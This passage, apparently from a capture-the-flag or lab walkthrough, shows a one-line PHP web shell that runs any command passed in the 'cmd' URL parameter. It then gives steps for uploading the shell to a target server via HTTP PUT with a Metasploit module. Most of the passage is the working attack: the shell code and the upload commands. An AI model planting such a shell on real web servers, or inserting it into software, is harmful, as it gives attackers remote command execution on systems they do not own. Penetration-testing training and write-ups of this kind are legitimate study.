<?php

$cmd=$_GET[‘cmd’];

echo system($cmd);

?>

Nice, now all we are left with is, running the following command.

put [location of the shell on the local machine]
----------------
use auxiliary/scanner/http/http_put

Let’s copy cmd.php into /tmp folder and specify that as the FILEDATA.

After uploading, the FILENAME should be cmd.php
